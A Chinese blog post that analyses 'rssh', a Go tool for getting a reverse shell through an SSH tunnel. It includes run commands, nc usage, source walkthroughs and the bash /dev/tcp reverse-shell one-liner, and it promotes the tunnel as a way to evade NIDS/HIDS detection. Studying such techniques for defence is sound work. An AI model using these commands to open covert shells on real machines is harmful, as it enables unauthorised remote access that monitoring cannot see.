---
title: 利用ssh 隧道反弹shell
top_img: https://www.apple.com.cn/newsroom/images/values/health/Apple-Health-study-July-2022-hero_big.jpg.large_2x.jpg
cover: https://www.apple.com.cn/newsroom/images/live-action/wwdc-2022/Apple-WWDC22-fraud-prevention-hero_big.jpg.large_2x.jpg
date: 2022-07-22 19:39:51
tags:
    - 安全
    - golang
    - 漏洞
    - Linux
categories: 
           - [安全]
           - [操作系统]
---

# 说明
>利用ssh隧道来反弹shell.

使用ssh进行隧道的好处：

1. SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据，同时能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务，这样能够避免被NIDS检测到；
2. SSH基本上在每个机器上面存在，不需要额外的条件;

# RSSH
rssh的说明是:
> This program is a simple reverse shell over SSH. Essentially, it opens a connection to a remote computer over SSH, starts listening on a port on the remote computer, and when connections are made to that port, starts a command locally and copies data to and from it.
>> rssh是一个利用SSH反弹shell的程序．原理就是通过SSH在远程服务器上监听一个端口，并执行远程服务器发送过来的数据.

# 运行
在本地运行: 
``` shell
 go run main.go -a ‘127.0.0.1:2222’ -u user -i id_remote_rsa IP.OF.REMOTE.MACHINE
```
正常运行就会如下的结果：
``` shell
main.go -a '127.0.0.1:2222' -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE
[  info ] listening for connections on IP.OF.REMOTE.MACHINE:22 (remote listen address: 127.0.0.1:2222)
```
此时，在服务器上面运行(IP.OF.REMOTE.MACHINE)运行 nc 127.0.0.1 2222 即可得到反弹shell.

>服务器端
``` shell
$ nc -c 127.0.0.1 2222
$ id
uid=1000(spoock) gid=1000(spoock) groups=1000(spoock),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```
``` shell
客户端
$ go run main.go -a '127.0.0.1:2222' -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE
[  info ] listening for connections on IP.OF.REMOTE.MACHINE:22 (remote listen address: 127.0.0.1:2222)
[  info ] accepted connection from: 127.0.0.1:33016
```
# 分析
>init & log
``` golang
func init() {
    // Global flags
    pf := mainCommand.PersistentFlags()
    pf.BoolVarP(&flagVerbose, "verbose", "v", false, "be more verbose")
    pf.BoolVarP(&flagQuiet, "quiet", "q", false, "be quiet")
    pf.BoolVarP(&flagTrace, "trace", "t", false, "be very verbose")
 
    // Local flags
    flags := mainCommand.Flags()
    flags.StringVarP(&flagSSHUsername, "username", "u", os.Getenv("USER"),
        "connect as the given user")
    flags.StringVarP(&flagSSHPassword, "password", "p", "",
        "use the given password to connect")
    flags.StringVarP(&flagSSHIdentityFile, "identity-file", "i", "",
        "use the given SSH key to connect to the remote host")
    flags.StringVarP(&flagAddr, "address", "a", "localhost:8080",
        "address to listen on on the remote host")
    flags.StringVarP(&flagCommand, "command", "c", "/bin/sh",
        "command to run")
}
 
func preRun(cmd *cobra.Command, args []string) {
    var cl *colog.CoLog
    logger, cl = makeLogger()
 
    if flagTrace {
        cl.SetMinLevel(colog.LTrace)
    } else if flagVerbose {
        cl.SetMinLevel(colog.LDebug)
    } else if flagQuiet {
        cl.SetMinLevel(colog.LWarning)
    } else {
        cl.SetMinLevel(colog.LInfo)
    }
```
在init()函数中主要是对一些参数的解释说明，同时也有对参数的校验的功能．

+ flagVerbose flagQuiet flagTrace　三者是表示日志的详细程度
+ username password identity-file 表示ssh登录认证的方法　可以使用那个用户名密码的方式也可以使用是公钥登录
+ address　远程服务器需要监听的端口，一般写为localhost:2222 或者是127.0.0.1:222 (写成localhost或者是127.0.0.1)
+ command 默认值是/bin/sh，是用来执行命令的shell环境

### runMain

runMain函数是rssh的主体．我们以`go run main.go -a '127.0.0.1:2222' -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE`为例来说明参数的含义

### sshHost
``` golang
if len(args) != 1 {
    log.Printf("error: invalid number of arguments (expected 1, got %d)", len(args))
    os.Exit(1)
}
 
sshHost := args[0]
 
// Add a default ':22' after the end if we don't have a colon.
if !strings.Contains(sshHost, ":") {
    sshHost += ":22"
}
```
判断远程地址需要存在，默认加上22端口．

### config.Auth
``` golang
// Password auth or prompt callback
if flagSSHPassword != "" {
    log.Println("trace: adding password auth")
    config.Auth = append(config.Auth, ssh.Password(flagSSHPassword))
} else {
    log.Println("trace: adding password callback auth")
    config.Auth = append(config.Auth, ssh.PasswordCallback(func() (string, error) {
        prompt := fmt.Sprintf("%s@%s's password: ", flagSSHUsername, sshHost)
        return speakeasy.Ask(prompt)
    }))
}
 
// Key auth
if flagSSHIdentityFile != "" {
    auth, err := loadPrivateKey(flagSSHIdentityFile)
    if err != nil {
        log.Fatalf("error: could not load identity file '%s': %s",
            flagSSHIdentityFile, err)
    }
 
    log.Println("trace: adding identity file auth")
    config.Auth = append(config.Auth, auth)
}
```

判断是通过用户名密码还是publickey的方式登录，分别进行不同的初始化的操作，`config.Auth = append(config.Auth, ssh.Password(flagSSHPassword))`或者是`auth, err := loadPrivateKey(flagSSHIdentityFile);config.Auth = append(config.Auth, auth)`
一个有意思的地方，如果是这种方式`go run main.go -a ‘127.0.0.1:2222’ -u USERNAME IP.OF.REMOTE.MACHINE`　参数中没有密码，那么最终就会执行：
``` golang
log.Println("trace: adding password callback auth")
config.Auth = append(config.Auth, ssh.PasswordCallback(func() (string, error) {
    prompt := fmt.Sprintf("%s@%s's password: ", flagSSHUsername, sshHost)
    return speakeasy.Ask(prompt)
}))
```
此时实际的运行效果是:
``` shell
go run main.go -a '127.0.0.1:2222' -u USERNAME  IP.OF.REMOTE.MACHINE -t
[ trace ] adding password callback auth                                                                                
[ debug ] attempting 2 authentication methods ([0x666500 0x666650])                                         
USERNAME@IP.OF.REMOTE.MACHINE:22's password: ［输入远程服务器SSH的密码］
[  info ] listening for connections on IP.OF.REMOTE.MACHINE:22 (remote listen address: 127.0.0.1:2222)
```
这种方式通过密码登录的方式同样也是可以的．

### sshConn

``` golang
sshConn, err := ssh.Dial("tcp", sshHost, config)
if err != nil {
    log.Fatalf("error: error dialing remote host: %s", err)
}
defer sshConn.Close()
```
通过`ssh.Dial("tcp", sshHost, config)`与远程服务器上面创建ssh链接．此时的网络状态是:
``` shell
 ss -anptw | grep 22 
tcp   LISTEN      0       128             0.0.0.0:22             0.0.0.0:*                                                                                     
tcp   ESTAB       0       0            172.16.1.2:60270   IP.OF.REMOTE.MACHINE:22      users:(("main",pid=29114,fd=5))                                               
 
$ ps -ef | grep 29114
spoock  29114 29034  0 15:46 pts/2    00:00:00 /tmp/go-build970759084/b001/exe/main -a 127.0.0.1:2222 -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE -t
```
与代码的执行情况是一致的．

### sshConn.Listen

这个就是rssh中的核心部分．代码如下：
``` golang
// Listen on remote
l, err := sshConn.Listen("tcp", flagAddr)
if err != nil {
    log.Fatalf("error: error listening on remote host: %s", err)
}
```

其中的flagAddr就是参数中设置的127.0.0.1:2222，这就相当于在ssh的链接中再次监听了本地(此处的本地指的是服务器的地址)的2222端口．
跟着进入到ssh.Listen实现中： `vendor/golang.org/x/crypto/ssh/tcpip.go`

``` golang
// Listen requests the remote peer open a listening socket on
// addr. Incoming connections will be available by calling Accept on
// the returned net.Listener. The listener must be serviced, or the
// SSH connection may hang.
func (c *Client) Listen(n, addr string) (net.Listener, error) {
    laddr, err := net.ResolveTCPAddr(n, addr)
    if err != nil {
        return nil, err
    }
    return c.ListenTCP(laddr)
}
```

这个函数的注释：Listen()函数创建了一个TCP连接listener，这个listener必须能够被维持，否则ssh连接就会被挂住．
进行跟踪进入ListenTCP, vendor/golang.org/x/crypto/ssh/tcpip.go
``` golang
// ListenTCP requests the remote peer open a listening socket
// on laddr. Incoming connections will be available by calling
// Accept on the returned net.Listener.
func (c *Client) ListenTCP(laddr *net.TCPAddr) (net.Listener, error) {
    if laddr.Port == 0 && isBrokenOpenSSHVersion(string(c.ServerVersion())) {
        return c.autoPortListenWorkaround(laddr)
    }
 
    m := channelForwardMsg{
        laddr.IP.String(),
        uint32(laddr.Port),
    }
    // send message
    ok, resp, err := c.SendRequest("tcpip-forward", true, Marshal(&m))
    if err != nil {
        return nil, err
    }
    if !ok {
        return nil, errors.New("ssh: tcpip-forward request denied by peer")
    }
 
    // If the original port was 0, then the remote side will
    // supply a real port number in the response.
    if laddr.Port == 0 {
        var p struct {
            Port uint32
        }
        if err := Unmarshal(resp, &p); err != nil {
            return nil, err
        }
        laddr.Port = int(p.Port)
    }
 
    // Register this forward, using the port number we obtained.
    ch := c.forwards.add(*laddr)
 
    return &tcpListener{laddr, c, ch}, nil
}
```
1. 合法性校验

``` golang
if laddr.Port == 0 && isBrokenOpenSSHVersion(string(c.ServerVersion())) {
return c.autoPortListenWorkaround(laddr)
}
func (c *Client) autoPortListenWorkaround(laddr *net.TCPAddr) (net.Listener, error) {
    var sshListener net.Listener
    var err error
    const tries = 10
    for i := 0; i < tries; i++ {
        addr := *laddr
        addr.Port = 1024 + portRandomizer.Intn(60000)
        sshListener, err = c.ListenTCP(&addr)
        if err == nil {
            laddr.Port = addr.Port
            return sshListener, err
        }
    }
    return nil, fmt.Errorf("ssh: listen on random port failed after %d tries: %v", tries, err)
}
```
如果检测到转发的端口或者是openssh的版本存在问题，就会调用autoPortListenWorkaround()函数任意创建一个端口．

2. 通过ssh转发端口
``` golang
m := channelForwardMsg{
laddr.IP.String(),
uint32(laddr.Port),
}
// send message
ok, resp, err := c.SendRequest("tcpip-forward", true, Marshal(&m))
if err != nil {
    return nil, err
}
if !ok {
    return nil, errors.New("ssh: tcpip-forward request denied by peer")
}
```
关键代码就是`c.SendRequest(“tcpip-forward”, true, Marshal(&m))`通过ssh的tcpip-forward转发ｍ(ｍ中有需要转发的端口和协议)

3. 返回Listener
``` golang
// Register this forward, using the port number we obtained.
ch := c.forwards.add(*laddr)
 
return &tcpListener{laddr, c, ch}, nil
```
在创建了连接完毕之后，服务器端的网络状态是:
``` shell
$ ss -anptw | grep 2222
tcp    LISTEN     0      128    127.0.0.1:2222                  *:*
 
$ ss -anptw | grep 22
tcp    ESTAB      0      0      172.27.0.12:22  
```
### Accept
``` golang
// Start accepting shell connections
log.Printf("info: listening for connections on %s (remote listen address: %s)", sshHost, flagAddr)
for {
    conn, err := l.Accept()
    if err != nil {
        log.Printf("error: error accepting connection: %s", err)
        continue
    }
 
    log.Printf("info: accepted connection from: %s", conn.RemoteAddr())
    go handleConnection(conn)
}
```

通过`　l, err := sshConn.Listen(“tcp”, flagAddr)`得到ssh转发的连接之后，开始进行监听`conn, err := l.Accept()．`对于建立之后的连接使用`handleConnection()`处理
### handleConnection
由于整个handleConnection()的整个函数较长，分部对其中的代码进行分析．

Create PTY
``` golang
// Create PTY
pty, tty, err := pty.Open()
if err != nil {
    log.Printf("error: could not open PTY: %s", err)
    return
}
defer tty.Close()
defer pty.Close()
 
// Put the TTY into raw mode
_, err = terminal.MakeRaw(int(tty.Fd()))
if err != nil {
    log.Printf("warn: could not make TTY raw: %s", err)
}
```

创建一个pty，用于执行从远程服务器上面发送过来的数据．

command
``` golang
// Start the command
cmd := exec.Command(flagCommand)　//flagCommand:/bin/sh
    // Hook everything up
cmd.Stdout = tty
cmd.Stdin = tty
cmd.Stderr = tty
if cmd.SysProcAttr == nil {
    cmd.SysProcAttr = &syscall.SysProcAttr{}
}
 
cmd.SysProcAttr.Setctty = true
cmd.SysProcAttr.Setsid = true
 
// Start command
err = cmd.Start()
```

上面这段代码就相当与创建了一个交互式的反弹shell,类似与`bash -i >& /dev/tcp/ip/port 0>&1`
在客户端创建完毕链接之后，在服务器端运行` nc -c 127.0.0.1 2222`，连接到本地的2222端口．此时服务器的网络状态是:
``` shell
ss -anptw | grep 2222
tcp    LISTEN     0      128    127.0.0.1:2222                  *:*                 
tcp    ESTAB      0      0      127.0.0.1:59070              127.0.0.1:2222                users:(("nc",pid=13449,fd=3))
tcp    ESTAB      0      0      127.0.0.1:2222               127.0.0.1:59070
 
$ ps -ef | grep 13449
USERNAME   13449  2642  0 17:12 pts/2    00:00:00 nc -c 127.0.0.1 2222
 
$ ls -al /proc/13449/fd
total 0
dr-x------ 2 USERNAME USERNAME  0 Jun 18 17:12 .
dr-xr-xr-x 9 USERNAME USERNAME  0 Jun 18 17:12 ..
lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 0 -> /dev/pts/2
lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 1 -> /dev/pts/2
lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 2 -> /dev/pts/2
lrwx------ 1 USERNAME USERNAME 64 Jun 18 17:12 3 -> socket:[169479331]
```
可以发现在服务器端的59070连接了2222端口，进程是13449．由于从客户端接受过来的数据都是经过ssh解密的，所以对于HIDS来说是很难发现异常的．
此时客户端的网络连接状态是：

``` shell
$ ss -anptw | grep 22  
tcp   LISTEN    0       128             0.0.0.0:22               0.0.0.0:*                                                                                     
tcp   ESTAB     0       0            172.16.1.2:41424      40.77.226.250:443     users:(("code",pid=5822,fd=49))                                               
tcp   ESTAB     0       0            172.16.1.2:37930      40.77.226.250:443     users:(("code",pid=5822,fd=41))                                               
tcp   ESTAB     0       0            172.16.1.2:33198     IP.OF.REMOTE.MACHINE:22      users:(("main",pid=32069,fd=5))                                               
tcp   ESTAB     0       0            172.16.1.2:57664      40.77.226.250:443     users:(("code",pid=5822,fd=40))                                               
tcp   LISTEN    0       128                [::]:22                  [::]:*
 
$ ps -ef | grep 32393
spoock  32393 32069  0 17:12 pts/4    00:00:00 /bin/sh
 
$ ls -al /proc/32393/fd
dr-x------ 2 spoock spoock  0 Jun 18 17:15 .
dr-xr-xr-x 9 spoock spoock  0 Jun 18 17:15 ..
lrwx------ 1 spoock spoock 64 Jun 18 17:15 0 -> /dev/pts/4
lrwx------ 1 spoock spoock 64 Jun 18 17:15 1 -> /dev/pts/4
lrwx------ 1 spoock spoock 64 Jun 18 17:15 10 -> /dev/tty
lrwx------ 1 spoock spoock 64 Jun 18 17:15 2 -> /dev/pts/4
 
$ ls -al /proc/32069/fd
dr-x------ 2 spoock spoock  0 Jun 18 17:01 .
dr-xr-xr-x 9 spoock spoock  0 Jun 18 17:01 ..
lrwx------ 1 spoock spoock 64 Jun 18 17:01 0 -> /dev/pts/2
lrwx------ 1 spoock spoock 64 Jun 18 17:01 1 -> /dev/pts/2
lrwx------ 1 spoock spoock 64 Jun 18 17:01 2 -> /dev/pts/2
lrwx------ 1 spoock spoock 64 Jun 18 17:01 3 -> 'socket:[559692]'
lrwx------ 1 spoock spoock 64 Jun 18 17:01 4 -> 'anon_inode:[eventpoll]'
lrwx------ 1 spoock spoock 64 Jun 18 17:01 5 -> 'socket:[559693]'
lrwx------ 1 spoock spoock 64 Jun 18 17:15 6 -> /dev/ptmx
lrwx------ 1 spoock spoock 64 Jun 18 17:15 7 -> /dev/pts/4
```
客户端的含义就是：在ssh连接进程中派生出了sh进程，在sh进程中执行命令，但是由于执行的命令全部都是通过ssh加密发送的，在流量上是无法看到．